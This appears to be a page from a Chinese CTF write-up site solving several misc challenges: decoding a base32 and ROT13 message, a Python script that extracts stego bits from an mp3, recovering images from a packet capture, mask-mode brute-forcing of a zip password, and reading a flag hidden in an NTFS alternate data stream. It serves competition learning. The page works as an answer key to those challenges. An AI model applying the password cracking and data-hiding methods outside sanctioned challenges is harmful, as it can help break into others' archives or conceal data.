<h3 id="mc_champion"><a class="header-link" href="#mc_champion"></a>mc_champion</h3>
<p>多买不同种类的东西，然后exchange 6卖掉，可以赚钱
Congratulation!
Encoded Message:
F5GUGMRQ
GIYC2RCF
IJKUOLKW
JFCVOORN
FEFFC4RR
KBDVG62G
GNYGQZJT
L5EGMTSU
GNPTA4ZN
KRBF6RTZ
OZYHE7T5</p>
<p>base32 然后+-13试一试</p>
<h3 id="mc_easybgm"><a class="header-link" href="#mc_easybgm"></a>mc_easybgm</h3>
<pre class="hljs"><code>a=open(<span class="hljs-string">'bgm.mp3'</span>,<span class="hljs-string">'rb'</span>).read()
a=[ord(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a]

i=<span class="hljs-number">0x28a3</span>
tmp1=<span class="hljs-string">''</span>

<span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> range(<span class="hljs-number">3285</span>):
    tmp1+=str(a[i+<span class="hljs-number">2</span>]%<span class="hljs-number">2</span>)
    i+=<span class="hljs-number">0x1a1</span>

tmp1 = <span class="hljs-string">'0b'</span> + tmp1[::<span class="hljs-number">-1</span>]
<span class="hljs-keyword">print</span> hex(int(tmp1,<span class="hljs-number">2</span>))[<span class="hljs-number">2</span>:<span class="hljs-number">-1</span>].decode(<span class="hljs-string">'hex'</span>)</code></pre><h3 id="misc-chowder"><a class="header-link" href="#misc-chowder"></a>Misc Chowder</h3>
<p>考察流量审计、压缩包密码爆破、NTFS流隐藏文件。
审计流量包，发现上传了7张图，wireshark导出<code>upload_file.php</code>对象，内容是上传图片时的HTTP包内容，其中包含了<code>png</code>的数据，恢复数据拿到图片。
在第七张图中是一个连接地址<code>https://drive.google.com/file/d/1JBdPj7eRaXuLCTFGn7AluAxmxQ4k1jvX/view</code></p>
<p>下载到一个<code>docx</code>文件，其中隐写了压缩包，解压需要密码，题目给出Hint：<code>压缩包密码暴破考点中，密码的长度为6位，前两位为DE</code>，用<code>ARCHPR</code>，掩码模式爆破密码，爆破出压缩包密码<code>DE34Q1</code>，解压之后是三个文件。</p>
<p>这个地方考NTFS流隐藏文件，在<code>666.jpg</code>文件中关联了另一个文件<code>fffffffflllll.txt</code>的内容，命令行下执行<code>notepad 666.jpg:fffffffflllll.txt</code>读取其数据流即可拿到flag。</p>
        </article>
      </div>
    </div>
  </body>
</html>
<!--
    This page is modified from the template https://www.codeply.com/go/7XYosZ7VH5 by Carol Skelly (@iatek).
    This writeup site is cloned and modified from https://github.com/balsn/ctf_writeup.
    Respective Copyrights apply.
 -->
